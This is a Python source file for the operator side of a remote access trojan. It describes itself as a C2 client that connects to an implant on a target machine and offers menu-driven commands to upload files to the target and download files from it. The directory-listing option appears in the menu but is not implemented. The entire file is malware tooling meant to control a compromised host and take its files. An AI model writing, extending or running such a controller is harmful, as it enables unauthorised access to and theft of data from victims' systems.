# Patrick Sacchet
# Version 1.0
# Serves as the main CMD client interface which will provide tasking to our RAT on target

import sys
import socket
import argparse
from RAT_Py_GetFile import *
from RAT_Py_PutFile import *
from RAT_Py_DirList import * 
#from scapy.all import * # switch from socket to scapy for custom TCP packets

SUCCESS = 1
FAILURE = 0
EXIT = 0


#-----------------------------------------------

#-----------------------------------------------
def printHelp():
    print("""Please select from the following options: \n
                1) Write a file to a location on target \n
                2) Get a file from a specific location on target\n
                3) Perform a dir list for a particular directory on target\n
                0) Exit\n""")
    return SUCCESS

#-----------------------------------------------

#-----------------------------------------------
def printGetFileHelp():
    print("""Required params: \n
                -filepath - path to file on target \n
                -outfilepath - file to write to locally \nOptional params: \n
                -overwrite - overwrite the file locally if it already exists (default: false)\n""")
    return SUCCESS

#-----------------------------------------------

#-----------------------------------------------
def printPutFileHelp():
    print("""Required params: \n
                -filepath - local path to file we are writing \n
                -outputfilepath - remote path we are writing to \nOptional params: \n
                -overwrite - overwrite the file if it already exists (default: false)\n""")
    return SUCCESS

#-----------------------------------------------

#-----------------------------------------------
def doConnect(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, int(port)))

    except Exception as e:
        print("ERROR: Could not connect to implant: ", e)
        return FAILURE

    return sock

#-----------------------------------------------

#-----------------------------------------------
def handleInput(ip, port):
    print("Reaching out to agent for connection establishment...")
    sock = doConnect(ip, port)

    print("Connected to agent at %s on port %d" % (sock.getpeername()[0], sock.getpeername()[1]))
    userInput = 1
    while (int(userInput) != EXIT):
        printHelp()
 
        userInput = input("> ")

        if (int(userInput) == PUT):
            printPutFileHelp()
            user_input = input("> ")
            parser = argparse.ArgumentParser(description='Perform a put file on target')
            parser.add_argument('-filepath', '--filepath', type=str, help='Path to file to put on target', action='store', required=True)
            parser.add_argument('-outputfilepath', '--localfilepath', type=str, help='Path to remote location on target we are writing to', action='store', required=True)
            parser.add_argument('-overwrite','--overwrite', help="Whether to overwrite an existing file of the same name on target", action='store_true', required=False)
            args = parser.parse_args(user_input.split())

            filepath = bytes(args.filepath, 'utf-8')

            outputfilepath = bytes(args.localfilepath, 'utf-8')

            # Needs to not be bool since we're sending this value over the wire 
            if (args.overwrite):
                overwrite = 1
            else:
                overwrite = 0

            putFile(sock, filepath, outputfilepath, overwrite)

        elif (int(userInput) == GET):
            printGetFileHelp()
            user_input = input("> ")
            parser = argparse.ArgumentParser(description='Perform a get file off target')
            parser.add_argument('-filepath', '--filepath', type=str, help='Path to file to get on target', action='store', required=True)
            parser.add_argument('-outfilepath', '--outfilepath', type=str, help='Path to output file write on local machine', action='store', required=True)
            parser.add_argument('-overwrite','--overwrite', help="Whether to overwrite an existing file of the same name on the local machine", action='store_true', required=False)
            args = parser.parse_args(user_input.split())
            
            filepath = bytes(args.filepath, 'utf-8')
            outfilepath = args.outfilepath

            if (args.overwrite):
                overwrite = True
            else:
                overwrite = False
            
            getFile(sock, filepath, outfilepath, overwrite)

    return

#-----------------------------------------------

#-----------------------------------------------
def main():
    parser = argparse.ArgumentParser(description='Python C2 script')
    parser.add_argument('-ip', '--ip', type=str, help='IP address of target', action='store', required=True)
    parser.add_argument('-port', '--port', type=str, help='Port number our implant is listening on', action='store', required=True)
    args = parser.parse_args()

    handleInput(args.ip, args.port)

    return SUCCESS

#-----------------------------------------------
if __name__ == '__main__':
    main()
